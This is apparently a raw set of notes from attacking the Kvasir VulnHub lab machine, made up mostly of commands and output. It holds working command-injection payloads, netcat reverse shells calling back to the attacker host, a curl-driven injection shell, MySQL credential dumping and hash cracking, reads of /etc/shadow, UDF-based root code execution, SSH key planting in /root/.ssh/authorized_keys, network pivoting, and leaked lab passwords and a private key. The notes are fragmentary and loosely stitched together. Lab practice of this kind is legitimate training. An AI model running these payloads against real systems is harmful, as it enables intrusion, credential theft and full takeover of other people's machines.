https://g0blin.co.uk/kvasir-1-vulnhub-writeup/

https://blog.knapsy.com/blog/2014/11/05/kvasir-vm-writeup/

* https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/

* https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/


https://geekflare.com/fr/tcpdump-examples/
https://connect.ed-diamond.com/MISC/misc-053/cryptanalyse-du-protocole-wep
http://repository.root-me.org/R%C3%A9seau/FR%20-%20Wifi%20protocole%20WEP%3A%20m%C3%A9canismes%20et%20failles.pdf

As part of the challenge, Kvasir utilises LXC to provide kernel isolation. When the host VM boots, it takes can take a little bit of time before the containers become available.

It is therefore advised to wait 30-60 seconds after the login prompt is presented, before attacking the VM.

A few other pointers:

    Not every LXC is ‘rootable’
    No SSH brute-forcing is required




sudo tcpdump host 192.168.110.42 -i vboxnet0 and icmp -X

apache2; echo "test" > /tmp/test; if [ $? -eq 0 ]; then ping -c 1 192.168.110.1; fi;
; echo "test" > /tmp/test; if [ $? -eq 0 ]; then ping -c 1 192.168.110.1; fi;
;if [ -f /tmp/test ]; then ping -c 1 192.168.110.1; fi;
;if [ -f /root/flag ]; then ping -c 1 192.168.110.1; fi;
;if [ -f /bin/sh ]; then ping -c 1 192.168.110.1; fi;
;id;
;cat /etc/passwd;
;ls -al /var/www;
;base64 admin.php;
;base64 submit.php;
;ping -c 3 192.168.2.200;
;/sbin/ifconfig;
;echo $PATH;
;netstat -tulpn;
;cat /etc/ssh/sshd_config;

;nc -e /bin/bash 192.168.110.1 443 


```bash

#!/bin/bash

# get cookie
curl -s -c cookie -d "username=test&password=test&submit=Login" http://192.168.110.42/login.php

# test
# curl -s -b cookie -d "service=;/sbin/ifconfig;&submit=Submit" http://192.168.110.42/admin.php | sed '/<pre>/,/<\/pre>/!d'  | sed -e 's/<[^>]*>//g'

echo -n "> "

while read cmd

do
    echo $cmd
    if [  "$cmd" == "exit" ]
    then
        exit 0
    fi
    curl -s -b cookie --data-urlencode "service=;${cmd};" --data-urlencode  "submit=Submit" http://192.168.110.42/admin.php  | sed '/<pre>/,/<\/pre>/!d'  | sed -e 's/<[^>]*>//g'
    echo -n "> "

done < "/proc/${$}/fd/0"

```

```php

// submit.php
<?php

if(!empty($_POST["username"]) && !empty($_POST["password"])) {

        $username = $_POST["username"];
        $password = $_POST["password"];
        $dob = $_POST["dob"];

        mysql_connect("192.168.2.200", "webapp", "webapp") or die(mysql_error());
        mysql_select_db("webapp") or die(mysql_error());

        $query = "INSERT INTO users (username, password, dob, admin, id) VALUES ('$username', '$password', '$dob', 0, NULL)";
        $result = mysql_query($query) or die(mysql_error());

        header ("Location: index.php");

}

?>
```



```console

mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'show grants;' 2>&1

mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; show tables;'  2>&1

mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; select * from todo;'  2>&1

mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use mysql; select DISTINCT User,Password from user;'  2>&1




root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD <<===


```
``` bash
$ hashcat -m 300 root.db /usr/share/wordlists rockyou.txt

ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater

```

```console

mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/etc/passwd');"  2>&1
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/etc/shadow');"  2>&1
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/etc/mysql/my.cnf');"  2>&1


mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/root/flag');"

mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@plugin_dir;'   2>&1
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@hostname;'   2>&1
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@secure_file_priv;' 2>&1

```




ssh -fN -R 3306:192.168.2.200:3306 -o StrictHostKeyChecking=no kali@192.168.110.1 -i /tmp/kali


> netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.2.100:22        0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -

> cat /etc/ssh/sshd_config
ListenAddress 192.168.2.100
Protocol 2

# scan ports 
for i in $(seq 1 65535); do nc -z -v 192.168.2.200 $i 2>&1 | grep 'open'; done
(UNKNOWN) [192.168.2.200] 21 (ftp) open
(UNKNOWN) [192.168.2.200] 22 (ssh) open
(UNKNOWN) [192.168.2.200] 1194 (openvpn) : Connection refused
(UNKNOWN) [192.168.2.200] 3306 (mysql) open



# pivot


cd /tmp && mknod backpipe p
nc -lvp 3306 0<backpipe | nc -v 192.168.2.200 3306 1>backpipe


mkfifo /tmp/fifo
nc -l -p 4444 < /tmp/fifo | nc -v 192.168.2.200 3306 > /tmp/fifo



### netcat

└─$ nc -l -v -p  4321

www-data@web:/tmp$ nc 192.168.110.1 4321 0<backpipe | nc 192.168.2.200 3306 | tee backpipe 


## msfconsole

```console

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 192.168.100.1
lhost => 192.168.100.1
msf6 exploit(multi/handler) > run

[-] Handler failed to bind to 192.168.100.1:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Command shell session 1 opened (192.168.110.1:4444 -> 192.168.110.42:54630) at 2021-09-08 11:21:13 +0200

^Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x86/linux               192.168.110.1:4444 -> 192.168.110.42:54630 (192.168.110.42)

msf6 exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.110.1:4433 
[*] Sending stage (984904 bytes) to 192.168.110.42
[*] Meterpreter session 2 opened (192.168.110.1:4433 -> 192.168.110.42:36697) at 2021-09-08 11:21:43 +0200
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                        Connection
  --  ----  ----                   -----------                                                        ----------
  1         shell x86/linux                                                                           192.168.110.1:4444 -> 192.168.110.42:54630 (192.168.110.42)
  2         meterpreter x86/linux  www-data @ web (uid=33, gid=33, euid=33, egid=33) @ 192.168.1.100  192.168.110.1:4433 -> 192.168.110.42:36697 (::1)

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > portfwd  add -l 3306 -p 3306 -r 192.168.2.200
[*] Local TCP relay created: :3306 <-> 192.168.2.200:3306
meterpreter > portfwd  add -l 22 -p 22 -r 192.168.2.200
[*] Local TCP relay created: :22 <-> 192.168.2.200:22

```

mysql -uwebapp -pwebapp -h 192.168.110.42

echo "select @@version;" > test
echo "select @@plugin_dir;" >> test
echo "select @@hostname;" >> test
echo "select DISTINCT User,Password from mysql.user;" >> test
mysql -uwebapp -pwebapp -h 192.168.2.200 < test
mysql -uwebapp -pwebapp -h 192.168.2.200 < key

mysql -uwebapp -pwebapp -h 192.168.2.200 < test.sql

DROP FUNCTION IF EXISTS sys_exec; CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; 

mysql -uwebapp -pwebapp -h 192.168.2.200 -e "SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTp5osRVyE4GWT/sKyLF4jqiR5E3j5ayWONqP15aUHrVpaAQ9lvVzGf4AHoeaPBT4cntjJpw8+6VAme1bKwF+XinJdFxmFVf1trcjCTVGkkSTFmGbzfD0PYEAB71rQFJzc9teWH63mt+o6SxgvJ6ntDJyUqDTJFEHlv6E6rk+3kyEEup/dfivqnT23kAJKKDbjaBynW6ukZVn2whAkoCv2fRZZULpUGZN24fLzmRlL/oBAp8Sz9v5BgpFiMybF/tXarflfmZTkOmIGmgRHl0Hz4EMhb0nJGYU7HGy6CEnM5UIKSP50gnea7IZC0of0ow3SVPVRZPl2lJsvZrqDq4SZYMf1RhLeUbn/ieUVuW8spwcGYWnKvLXbA8kl8EyDkDyrfJivMpX+HqaR3idzgzKmZEaozfGsZ71pWesQUHj3Onsi/6GpAXe+BuZNquy9WBn2dFCzVwx60UaOI4ASivJycD0ur+5eCxKLeMA/v7bTj7LKMPE9+genrGXO04RARS8= kali@kali' INTO OUTFILE '/tmp/authorized_keys';" 



mysql -uwebapp -pwebapp -h 192.168.2.200 -e "select 'kali';" 
mysql -uwebapp -pwebapp -h 192.168.2.200 -e "select 'kali' INTO OUTFILE '/tmp/authorized_keys';" 


mysql -uwebapp -pwebapp -h 127.0.0.1 -e "select 'kali';" 

mysql -uroot -pcoolwater -h 192.168.2.200 < test.sql


mysql -uroot -pcoolwater -h 192.168.2.200 < udf4 2>err
cat err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/usr/lib/mysql/plugin/udf_exploit4.so');" 2> err
cat err


mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS do_system; "  2> err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS sys_exec; "  2>> err



mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;"
mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS sys_get;"
mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS sys_set;"
mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS sys_exec;"
mysql -uroot -pcoolwater -h 192.168.2.200 -e "DROP FUNCTION IF EXISTS sys_eval;"


mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION sys_exec RETURNS integer SONAME 'udf_exploit.so'; "
mysql -uroot -pcoolwater -h 192.168.2.200 -e "create function sys_exec returns integer soname 'udf_exploit.so';"

mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION sys_get RETURNS string SONAME 'udf_exploit3.so';" 2> err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION sys_set RETURNS int SONAME 'udf_exploit3.so';" 2>> err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION sys_eval RETURNS string SONAME 'udf_exploit3.so';" 2>> err

mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit4.so';" 2> err

mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit4.so'; " 2> err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION do_system RETURNS int SONAME 'udf_exploit4.so';" 2> err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "CREATE FUNCTION do_system RETURNS int SONAME 'udf_exploit4.so';" 2> err



mysql -uroot -pcoolwater -h 192.168.2.200 -e "SELECT sys_exec(\"chmod 600 /root/.ssh/authorized_keys\"); " 2> err




mysql -uroot -pcoolwater -h 192.168.2.200 < key 2>err



echo  >> payload


mysql -uroot -pcoolwater -h 192.168.2.200 -e "select * from mysql.func;"


 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');

mysql -uroot -pcoolwater -h 192.168.2.200 -e "select sys_exec('echo zzzzzzz > /tmp/out'); "  2>err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/tmp/out');"



mysql -uroot -pcoolwater -h 192.168.2.200 -e "select sys_exec(\"id > /tmp/out\"); " 2>err
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select do_system('ls > /tmp/llll'); "
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/tmp/out'); "

create function do_system returns integer soname 'raptor_udf2.so';


echo "DROP FUNCTION IF EXISTS sys_exec; " >> payload
echo "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; " >> payload
echo "SELECT '" >> payload
cat ~/.ssh/id_rsa.pub >> payload
echo "' INTO OUTFILE \"/root/.ssh/authorized_keys\"; " >> payload
echo "SELECT sys_exec(\"chmod 600 /root/.ssh/authorized_keys\"); " >> payload

cat payload | tr -d '\n' > payload2
rm payload
mv payload2 payload








mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/root/.ssh/authorized_keys');"

mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/tmp/authorized_keys');"

SELECT sys_exec("chmod 600 /tmp/authorized_keys");
SELECT sys_exec("chmod 600 /root/.ssh/authorized_keys");


mysql -uroot -pcoolwater -h 192.168.2.200 -e "select 'Tan Tai Bui' into dumpfile '/tmp/btt';"
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/tmp/btt');"
/usr/lib/mysql/plugin/udf_exploit.so

/usr/lib/mysql/plugin/udf_exploit.so

mysql -uroot -pcoolwater -h 192.168.2.200 -e "select 'test' into dumpfile '/tmp/abc1';" 2>&1
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/tmp/abc1');"
mysql -uroot -pcoolwater -h 192.168.2.200 -e "select LOAD_FILE('/tmp/abc');"

 /root/.ssh/authorized_keys


https://github.com/sqlmapproject/udfhack/tree/master/linux/lib_mysqludf_sys




SELECT LOAD_FILE('/etc/passwd');



select "test" into dumpfile '/tmp/abc';





ssh -fN -R 13333:192.168.2.200:3306 -o StrictHostKeyChecking=no kali@192.168.110.1 -i /tmp/kali


mysql -uroot -pcoolwater -h 127.0.0.1 -e  "select sys_exec(\"id > /tmp/out\"); "
mysql -uroot -pcoolwater -h 127.0.0.1 -e  "select LOAD_FILE('/tmp/out');"






route add -net 192.168.2.0/24 gateway  192.168.110.41

route delete -net 192.168.2.0/24 gateway  192.168.110.41


nc -v -w 30 -p 31337 -l < .ssh/id_rsa.pub

;nc -v -w 2 192.168.110.1 31337 >  /var/www/.ssh/authorized_keys;
;nc -v -w 2 192.168.110.1 31337 >  /tmp/authorized_keys;
;nc -v -w 2 192.168.110.1 31337 >  .ssh/authorized_keys;



mysql -uroot -pcoolwater -h 192.168.2.200

use webapp; 
create table kwek (data longtext);
insert into kwek values ('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC//jHJCV48PVebfn/Y5ZZIkDs8OiM8MM/dywR13WZT6zezSaV13Jb++D5578o4sI60UtIcuxoiuh3Z6wzDod8mGbLYIicVbiek6VuIfvhtqH5kDN94zNH+CuBGDTNMkHhoUo2kIjvOaG97gg3VCU0v1La9JM1g5xoiqR8IF5RrjGdVvt6jY2SaMk0wDlCyLgicH5TaDKnX8QAg1o8lNbHYBvEKB1O9PKB5yvCyX6L+I+NZiGqANXBBmjDbdsma5T6/rRb7y+6zlG+xFwlablLWp7GVArP1ol9L+iYz43Rr+iJtNfM+USTvSqwYKEA6P2uag9fsiI34L6d/GJ541bu7 www-data@web');
select * from kwek;
select * from kwek into outfile '/root/.ssh/authorized_keys';



select LOAD_FILE('/root/.ssh/authorized_keys');


wget https://www.exploit-db.com/download/1518

 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 
---

 * $ gcc -fPIC -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * xxd -p raptor_udf2.so | tr -d '\n'
 * mysql> select x'7f454c460..97400' into dumpfile '/usr/lib/mysql/plugin/raptor.so'
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;

mysql> select LOAD_FILE('/root/.ssh/authorized_keys');
mysql> select do_system('chown root.root /root/.ssh/authorized_keys');
mysql> select do_system('chmod 600 /root/.ssh/authorized_keys');
mysql> select LOAD_FILE('/root/.ssh/authorized_keys');



;nc -e /bin/sh 192.168.110.1 4444;


ssh -fN -R 3333:192.168.2.200:3306 -o StrictHostKeyChecking=no kali@192.168.110.1  2>err
ssh -fN -R 3333:192.168.2.200:3306 -o StrictHostKeyChecking=no kali@192.168.110.1 -i kali 2>err
ssh -fN -R 2222:192.168.2.200:22 -o StrictHostKeyChecking=no kali@192.168.110.1 -i new 2>err

ssh -fN -R 3333:192.168.2.200:3306 -o StrictHostKeyChecking=no kali@192.168.110.1 -i kvasir 2>&1
ssh -fN -R 2222:192.168.2.200:22 -o StrictHostKeyChecking=no kali@192.168.110.1 -i kvasir 2>&1

ssh -o StrictHostKeyChecking=no debian32@192.168.24 -i id_debian 2>&1

AAAAB3NzaC1yc2EAAAADAQABAAABAQDOId2vGF2BEHzaJfVdku+aHDCzrno6a4qbzErejqWWO4HimCT1LY78O1lVSsSESMtkdQwsIiS6mTU9tWnj3CvVVON42uBwE0Cn82TrkKGcU58WpTG5CWp80uBIBvvejytKP5bn9Jw8KVnxW8UnUMG98fAlQmlQc2WOHUhq4lJDGmOyNqo9dxZ4SCxjnt2CumWgBnwTTDeI2A8g+YO9lJFN6Jx/Q7w1x9myGqDQnGef2OZ0T0aktAcqmq/S8qbdPyp6EJxZSZgDnenVJyJaM+IJz3y5JqPWBFWJ1gxTvqGRGIX/FMh2a8PUx5WSRycLcaAWV+seXPbQKZgj1UN8dr9R


Key 

Error ?

TF=$(mktemp -u)
echo $TF
mkfifo $TF
nc 192.168.110.1 4321 <>$TF >&0 &&

2>&1



for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done

root@db:/etc/pure-ftpd# cat pureftpd.passwd
celes:$1$LwZNkFH0$8rq4AbiYLXkfSMPXB1psV/:1000:1000::/var/log/./::::::::::::


celes@dev1:~$ find  / -type f -name kvasir.png 2>/dev/null 

#!/usr/bin/env python

## Under development ##

from ftplib import FTP
import time

ftp = FTP('192.168.3.200')
ftp.login('celes', 'im22BF4HXn01')

print ftp.dir()

ftp.close()


* * * * * /home/celes/getLogs.py &

root@db:~# tcpdump -i eth1  port ftp

tcpdump  -i eth1 src 192.168.3.40 and dst port ftp -c 10 -w ftp.pcap
celes@dev1:~$ head .bash_history
stepic --help





for ip in $(seq 1 254); do
ping -c 1 192.168.3.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done

for ip in $(seq 1 254); do
ping -c 1 192.168.3.$ip > /dev/null &
[ $? -eq 0 ] && echo Node with IP: $i is up.
done


for ip in $(seq 1 254); do
ping -c 1 192.168.0.$ip > /dev/null &
[ $? -eq 0 ] && echo Node with IP: $i is up.
done

for ip in $(seq 10 15); do
ping -c 1 192.168.0.$ip > /dev/null
[ $? -eq 0 ] && echo Node with IP: 192.168.0.$ip is up.
done


for ip in 1 192.168.3.{1..254}; do ping -c 1 -t 1 $ip > /dev/null && echo "${ip} is up"; done
nc -z 8.8.8.8 53  >/dev/null 2>&1


for i in $(seq 1 65535); do nc -z -v 127.0.0.1 $i 2>&1 | grep 'open'; done

nc -z -v 127.0.0.1 1-65535

timeout 1 bash -c "echo >/dev/tcp/$host/$port" &&
    echo "port $port is open" ||
    echo "port $port is closed"



nc -z 8.8.8.8 53  >/dev/null 2>&1
online=$?
if [ $online -eq 0 ]; then
    echo "Online"
else
    echo "Offline"
fi



#!/bin/bash
TF=$(mktemp -u)
touch $TF
is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
}

for i in 192.168.0.{1..254} 
do
is_alive_ping $i & disown
done
sleep 1
cat $TF
rm $TF


celes@dev1:~$ cat test.py 
import socket
import sys

thisdict = {}

f = open("words.txt", "r")
lines = f.readlines()
count = 0
for line in lines:
        count += 1
        line = line.strip()
        line_sorted = "".join(sorted(line))
        # print("{} : {} : {}".format(count, line, line_sorted))
        thisdict[line_sorted] = line




# nc 192.168.3.50 4444




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# now connect to the web server on port 80 - the normal http port
s.connect(("192.168.3.50", 4444))



def solve():

        chunks = []
        while True:
            chunk = s.recv(4096)
            chunks.append(chunk)
            if ":" in chunk:
                break

        solve = "{}".format(b''.join(chunks))
        print(solve)

        anagram = solve.split(":")
        w = anagram[1].strip()
        w_sorted = "".join(sorted(w))
        repons = thisdict[w_sorted]

        print ("{} : {} : {}".format(w, w_sorted, repons) )
        return repons

for i in range(100):
        rst = solve()
        s.send(rst+"\n")




s.close()

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D

OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
-----END RSA PRIVATE KEY-----




terra@dev2:~$ cat jumble.py
#!/usr/bin/env python

import random, time, socket, thread

words = ("borne","precombatting","noncandescent","cushat","lushness","precensure","romishness","nonderivable","overqualification","superkojiman","bacteriophage","proempiricist","monodimetric","aeromantic","mongreliser","nonmediative","teh3ck","underset","sereneness","chavin","enduringly","logopedics","thecolonial","gandhiist","redneck","recrudesce","subjack","drossiness","antimaterialistic","cynicism","kriemhild","chargeless","cumuliform","marica","barrebas","zouave","bibliophilism","pretorial","dream","retrad","unshivered","undefending","torchier","pereion","hobgoblin","thenar","acidifier","cotangent","rudy","dunny","logographic","drainboard","matriclinous","ricochetted","totemically","pemphigous","kirigami","imponderably","spanemic","drifter","sulfatized","psychosurgery","superficially","undidactic","brundidge","monochromatic","diastasis","libelee","lappeenranta","nonfacility","prowfishes","densifier","thucydides","profitability","sanaa","zethus","creature","brahminist","victoriousness","overpunishment","arguable","invercargill","chapiter","undeputed","unversatility","decidual","cayenne","devoted","forehandedly","semisecret","graphonomy","lauric","radiative","pyrophyllite","unenticing","roughhewn","g0tmi1k","propagableness","pollyanna","prearrest")

def handler(cSock, addr):

        cSock.send("Hello Celes & Welcome to the Jumble!\n\n")

        count = 0
        score = 0
        start = time.time()

        while (count < 60):

                word = random.choice(words)
                correct = word
                jumble = ""

                while word:
                        position = random.randrange(len(word))
                        jumble += word[position]
                        word = word[:position] + word[(position + 1):]

                cSock.send("Solve:" + jumble + " ")
                guess = cSock.recv(1024)

                if correct in guess:
                        score += 2
                        count += 1
                else:
                        count += 1

                current = (time.time() - start)

        if score >= 120 and current <= 30:
                cSock.send("\nScore: " + str(score) + "\n")
                cSock.send("Time: %.2f " % current + "secs\n")
                cSock.send("You're a winner\n")
                cSock.send("LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBBRVMtMTI4LUNCQyw3Njg0MTgyMkFCOUU3NzJGRDFENjUzRjYxNzlGMEU0RAoKT3JFTTJvY25oSEtnNW51SDdwczFDb09KQ2loYXNtRkpLTE9WTk5ZRk9oR0tVb2pQWUV0YTV5T2hJc2tmMGgwcgpTbyt4VkRLNjdHM0RsZ3ltVVYzRHhHZml6TGZadmh4UVJDOFF5MG1mNE4rbWlZa3ZmMk5hRnRhdHBOY2pLNXBNClV5NlFTRk1PQzhhS3BlMEZMNlVHRFJKUTVHU0c0RGxKckxVSkJNdm5TTHRZWkhsYVdBSUNLYlhmcFhWNFNUd3YKSjBEOGg5UnRsUkpoTENLNWVLZ3VwWUNRSWlHUVdnM1B2WnBYazlra2pYaG1PUXdVWW9DUmwzbDRqNXpsbkZjVApQNlU5VVBoUnEvQ2s0UXJrMmRHeEZmcHBRZDl4VytiNFBXamlTQ2lrTEYzUTBoZk5OdkVidTRvdW5BZ1l3UEZICmpPWEhKcXhWb2cvcFp6OVk4WGZTUDNoejlBWUhXZkkyaUM5Q25rN2JvUmNPdittY2dFZVdXa1lyVnNjT2l2WWoKOU4yeGlOcDRHSCtOSUc4bW0vTGRsN2pRTWwvVnJyNWN4M2ZYak9lem1nc1NrQVk0Q2NzcHdLc1NYSzhHTC9iTwpoVDZwS1dmTDZVSTh3VWdwSTdLaGdLK0FPS3VTL1hQWVRTZHorMFJKeE5GU0xPRk5jalJ0TCtOVzBValBxNUpoCkRpYStwdzVxQitsbGx4Z2FOMFdCUXNrSUZRcHBwUG93d2pHOEpnOGpKQmpTWWozcjRMSXJad0pTcGN2b0JpVUEKb0NxblFVTXRYbE1oOS9DdkJCR3MxK0pWY2prSW5CZGU5NDVWK2VqaFA2R1BZanU0VFFWN0I3MGQ3YUVXME9FbQowZDduck9XL0xDWXBzVi9ONXJxVnNHbFR2d2pKTm93eU1xRVo5RTA5Z3VNNWVMNENFUFBtcDlaRGV5MmZCQUd3CnE3blNyOHE2SHNmNGQrWVBSKzkwRWZNSlJlcUkzczFGUW9UdngrUGFGUGlLdzdkZkhGQ2dMc2NYY1hjb2duTHoKY0IwbG5lbUkrY0ZtZlk3NEYxZVlMM2Z3Skl3U1JnSzg1WGMyTXk4c3FKejFpemo2SWxPMmtRMWpMa3JoSk9aOApYK3AvOXc1ekEweDJmYmpwcEhhYytZb0pmeVB5WVhqa3BpZ0RQakhYaFJpdDJxblVySGZEYzBGamg1QUtOVTJLCk1VL3l3WEdFZzZ3MENwcEs5SkJvMHUveEpsaFQvak9XTmlNNFlaalhsaFF6a3h5ZWJ2YnlSUzZTbGhsbzE0MmwKZ011TVV2UG4xZkFlbmlyNkFGd3kycmxrdFE1L2E4ejJWQ3dQa05BNDBNSW1TSE1XUlNGYm9Eak01endyMjRHawpOMHBJMUJDbUNzZjBtc3ZFd0xoZGNWbmhKW